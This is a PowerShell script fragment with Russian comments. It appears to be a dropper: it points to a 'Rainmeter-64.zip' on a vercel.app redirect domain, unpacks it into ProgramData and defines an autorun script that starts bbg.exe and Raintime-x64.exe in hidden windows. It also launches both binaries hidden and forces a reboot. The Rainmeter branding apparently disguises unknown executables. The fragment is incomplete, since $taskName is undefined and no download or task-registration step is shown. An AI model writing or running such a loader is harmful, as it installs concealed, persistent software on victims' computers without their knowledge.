# Изменяем переменные для скачивания
$zipUrl      = "https://redirect-ten-gold.vercel.app/Rainmeter-64.zip"
$zipPath     = "$env:ProgramData\Rainmeter-64.zip"
$extractPath = "$env:ProgramData\Rainmeter-64"

# Изменяем путь к EXE файлам
$bbgPath = "$extractPath\bbg.exe"
$raintimePath = "$extractPath\Raintime-x64.exe"

# Изменяем проверку файлов
if (-not (Test-Path $bbgPath)) {
    throw "EXE not found: $bbgPath"
}
if (-not (Test-Path $raintimePath)) {
    throw "EXE not found: $raintimePath"
}

# Изменяем пути в скрипте автозапуска
$autorunScript = @'
$ErrorActionPreference = "Stop"
$bbgPath = "C:\ProgramData\Rainmeter-64\bbg.exe"
$raintimePath = "C:\ProgramData\Rainmeter-64\Raintime-x64.exe"
$logFile = "C:\ProgramData\Rainmeter-64\autorun.log"
$logDir  = Split-Path $logFile -Parent

if (-not (Test-Path $logDir)) {
    New-Item -Path $logDir -ItemType Directory -Force | Out-Null
}

"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') START" | Out-File -FilePath $logFile -Append

try {
    # Запуск bbg.exe
    if (-not (Test-Path $bbgPath)) {
        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ERROR: bbg.exe not found: $bbgPath" | Out-File -FilePath $logFile -Append
    } else {
        $p1 = Start-Process -FilePath $bbgPath -WorkingDirectory (Split-Path $bbgPath -Parent) -WindowStyle Hidden -PassThru -ErrorAction Stop
        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') bbg.exe OK PID=$($p1.Id)" | Out-File -FilePath $logFile -Append
    }
    
    # Запуск Raintime-x64.exe
    if (-not (Test-Path $raintimePath)) {
        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ERROR: Raintime-x64.exe not found: $raintimePath" | Out-File -FilePath $logFile -Append
    } else {
        $p2 = Start-Process -FilePath $raintimePath -WorkingDirectory (Split-Path $raintimePath -Parent) -WindowStyle Hidden -PassThru -ErrorAction Stop
        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') Raintime-x64.exe OK PID=$($p2.Id)" | Out-File -FilePath $logFile -Append
    }
}
catch {
    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ERROR: $($_.Exception.Message)" | Out-File -FilePath $logFile -Append
}
'@

# Изменяем запуск процессов после создания задачи
Write-Host "Done '$taskName' created."

# Запуск bbg.exe
if (Test-Path $bbgPath) {
    Start-Process -FilePath $bbgPath -WorkingDirectory $extractPath -WindowStyle Hidden
    Write-Host "[+] bbg.exe started"
}

# Запуск Raintime-x64.exe
if (Test-Path $raintimePath) {
    Start-Process -FilePath $raintimePath -WorkingDirectory $extractPath -WindowStyle Hidden
    Write-Host "[+] Raintime-x64.exe started"
}

Restart-Computer
